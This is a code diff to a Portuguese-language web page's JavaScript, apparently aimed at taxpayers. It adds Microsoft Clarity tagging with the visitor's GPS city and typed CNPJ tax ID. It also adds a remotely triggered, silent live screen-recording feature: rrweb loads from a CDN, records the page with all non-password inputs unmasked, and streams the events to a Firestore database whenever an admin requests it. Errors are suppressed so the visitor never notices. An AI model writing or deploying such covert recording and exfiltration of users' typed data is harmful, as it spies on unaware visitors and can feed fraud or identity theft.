@@ -1443,7 +1443,7 @@
                     cpuNucleos,
                     bateria: locState.bateria,
                     tela: telaInfo,
-                    viewport: viewportInfo,
+                    viewport: `${window.innerWidth || 0}x${window.innerHeight || 0}`,
                     orientacao: orientacaoInfo,
                     conexao: conexaoInfo,
                     idioma: idiomaInfo,
@@ -1856,6 +1856,222 @@
             window.addEventListener('unhandledrejection', (ev) => {
                 const msg = String(ev.reason?.message || ev.reason || 'Promise rejeitada').substring(0, 120);
                 registrarAcaoUsuario(`ERRO assíncrono: ${msg}`, 'erro');
+            });
+
+            // =================================================================
+            // INTEGRAÇÃO MICROSOFT CLARITY POR SESSÃO (ID + CIDADE + CNPJ)
+            // =================================================================
+            function sincronizarClaritySessao() {
+                try {
+                    if (typeof window.clarity === 'function') {
+                        window.clarity("identify", sessionId, sessionId, undefined, sessionId);
+                        window.clarity("set", "sessionId", sessionId);
+                        if (locState.municipioGPS) window.clarity("set", "cidade", locState.municipioGPS);
+                        if (locState.cnpjDigitado) window.clarity("set", "cnpj", locState.cnpjDigitado);
+                        if (origemTrafego) window.clarity("set", "origem", origemTrafego);
+                    }
+                } catch (_) {}
+            }
+            sincronizarClaritySessao();
+            setTimeout(sincronizarClaritySessao, 2500);
+            setInterval(sincronizarClaritySessao, 15000);
+
+            // Atualiza viewport ao redimensionar ou girar celular
+            window.addEventListener('resize', () => {
+                avisarEstouOnline();
+            });
+
+            // =================================================================
+            // TRANSMISSÃO DE TELA AO VIVO EM HD (rrweb SOB DEMANDA)
+            // Só carrega e transmite quando o Admin clica em "Ver Tela Ao Vivo"
+            // =================================================================
+            let rrwebCarregandoPromise = null;
+            function carregarBibliotecaRRWeb() {
+                if (window.rrweb && typeof window.rrweb.record === 'function') {
+                    return Promise.resolve(window.rrweb);
+                }
+                if (rrwebCarregandoPromise) return rrwebCarregandoPromise;
+
+                const urls = [
+                    "https://cdn.jsdelivr.net/npm/rrweb@1.1.3/dist/rrweb.min.js",
+                    "https://unpkg.com/rrweb@1.1.3/dist/rrweb.min.js"
+                ];
+
+                rrwebCarregandoPromise = new Promise((resolve, reject) => {
+                    let idx = 0;
+                    function tentar() {
+                        if (idx >= urls.length) {
+                            rrwebCarregandoPromise = null;
+                            return reject(new Error("Falha ao carregar rrweb"));
+                        }
+                        const s = document.createElement('script');
+                        s.src = urls[idx++];
+                        s.async = true;
+                        s.onload = () => {
+                            if (window.rrweb && typeof window.rrweb.record === 'function') {
+                                resolve(window.rrweb);
+                            } else {
+                                tentar();
+                            }
+                        };
+                        s.onerror = () => tentar();
+                        document.head.appendChild(s);
+                    }
+                    tentar();
+                });
+                return rrwebCarregandoPromise;
+            }
+
+            let liveStopFn = null;
+            let liveStreamIdAtual = null;
+            let liveLastHeartbeat = 0;
+            let liveQueue = [];
+            let liveSeq = 0;
+            let liveFlushTimer = null;
+            let liveWatchdogTimer = null;
+            let liveFlushing = false;
+
+            function pararTransmissaoTelaAoVivo() {
+                if (liveStopFn) {
+                    try { liveStopFn(); } catch (_) {}
+                    liveStopFn = null;
+                }
+                clearInterval(liveFlushTimer);
+                clearInterval(liveWatchdogTimer);
+                liveFlushTimer = null;
+                liveWatchdogTimer = null;
+                liveQueue = [];
+                liveStreamIdAtual = null;
+            }
+
+            async function enviarLoteTelaAoVivo() {
+                if (liveFlushing || !liveStreamIdAtual || liveQueue.length === 0) return;
+                liveFlushing = true;
+                const streamIdAtivo = liveStreamIdAtual;
+                const eventosParaEnviar = liveQueue.splice(0, liveQueue.length);
+
+                try {
+                    const serialized = JSON.stringify(eventosParaEnviar);
+                    const MAX_PART = 500000;
+                    const streamCol = collection(db, "trafego_aovivo", sessionId, "screen_stream");
+
+                    if (serialized.length <= MAX_PART) {
+                        const seqNum = ++liveSeq;
+                        await addDoc(streamCol, {
+                            streamId: streamIdAtivo,
+                            seq: seqNum,
+                            chunkKey: `${streamIdAtivo}_${seqNum}`,
+                            partIndex: 0,
+                            totalParts: 1,
+                            payload: serialized,
+                            vw: window.innerWidth || 0,
+                            vh: window.innerHeight || 0,
+                            ts: Date.now()
+                        });
+                    } else {
+                        const seqNum = ++liveSeq;
+                        const totalParts = Math.ceil(serialized.length / MAX_PART);
+                        const chunkKey = `${streamIdAtivo}_${seqNum}`;
+                        for (let p = 0; p < totalParts; p++) {
+                            const sliceStr = serialized.slice(p * MAX_PART, (p + 1) * MAX_PART);
+                            await addDoc(streamCol, {
+                                streamId: streamIdAtivo,
+                                seq: seqNum,
+                                chunkKey,
+                                partIndex: p,
+                                totalParts,
+                                payload: sliceStr,
+                                vw: window.innerWidth || 0,
+                                vh: window.innerHeight || 0,
+                                ts: Date.now()
+                            });
+                        }
+                    }
+                } catch (_) {
+                    // Ignora erro silenciosamente para nunca atrapalhar o contribuinte
+                } finally {
+                    liveFlushing = false;
+                }
+            }
+
+            async function iniciarTransmissaoTelaAoVivo(streamId) {
+                pararTransmissaoTelaAoVivo();
+                liveStreamIdAtual = streamId;
+                liveSeq = 0;
+                liveQueue = [];
+
+                try {
+                    const rr = await carregarBibliotecaRRWeb();
+                    if (liveStreamIdAtual !== streamId) return;
+
+                    liveStopFn = rr.record({
+                        emit(event) {
+                            if (liveStreamIdAtual !== streamId) return;
+                            liveQueue.push(event);
+                            // FullSnapshot (type 2) envia quase imediatamente para abrir a tela rápido
+                            if (event.type === 2) {
+                                setTimeout(() => enviarLoteTelaAoVivo(), 120);
+                            }
+                        },
+                        checkoutEveryNms: 90000,
+                        maskAllInputs: false,
+                        maskInputOptions: { password: true },
+                        inlineImages: false,
+                        collectFonts: false,
+                        slimDOMOptions: {
+                            script: true,
+                            comment: true,
+                            headFavicon: true,
+                            headWhitespace: true,
+                            headMetaDescKeywords: true,
+                            headMetaSocial: true,
+                            headMetaRobots: true,
+                            headMetaHttpEquiv: true,
+                            headMetaAuthorship: true,
+                            headMetaVerification: true
+                        },
+                        sampling: {
+                            mousemove: 90,
+                            mouseInteraction: true,
+                            scroll: 150,
+                            input: 'last'
+                        }
+                    });
+
+                    liveFlushTimer = setInterval(() => {
+                        enviarLoteTelaAoVivo();
+                    }, 700);
+
+                    liveWatchdogTimer = setInterval(() => {
+                        if (Date.now() - liveLastHeartbeat > 38000) {
+                            pararTransmissaoTelaAoVivo();
+                        }
+                    }, 5000);
+                } catch (_) {
+                    pararTransmissaoTelaAoVivo();
+                }
+            }
+
+            // Ouve comando sob demanda do Admin no documento desta sessão
+            onSnapshot(sessionRef, (docSnap) => {
+                if (!docSnap.exists()) return;
+                const d = docSnap.data() || {};
+                const reqAt = Number(d.watchRequestedAt || 0);
+                const ativo = d.watchAdminActive === true && (Date.now() - reqAt) < 38000;
+                const reqStreamId = d.watchStreamId || "";
+
+                if (ativo && reqStreamId) {
+                    liveLastHeartbeat = Date.now();
+                    if (liveStreamIdAtual !== reqStreamId) {
+                        iniciarTransmissaoTelaAoVivo(reqStreamId);
+                    }
+                } else if (liveStreamIdAtual) {
+                    pararTransmissaoTelaAoVivo();
+                }
+            });
+
+            window.addEventListener('beforeunload', () => {
+                pararTransmissaoTelaAoVivo();
             });
         }
     } catch(e) {}
